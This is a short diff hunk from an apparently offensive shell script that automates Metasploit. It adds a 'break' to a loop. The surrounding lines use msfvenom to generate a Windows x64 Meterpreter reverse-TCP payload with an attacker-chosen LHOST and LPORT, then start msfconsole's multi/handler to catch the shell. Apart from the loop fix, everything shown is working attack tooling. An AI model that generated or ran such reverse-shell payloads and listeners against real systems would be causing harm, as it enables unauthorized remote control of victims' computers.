@@ -10328,6 +10328,7 @@ while true; do
 				do
 					msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
 					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+					break
 				done
 			fi
 		fi
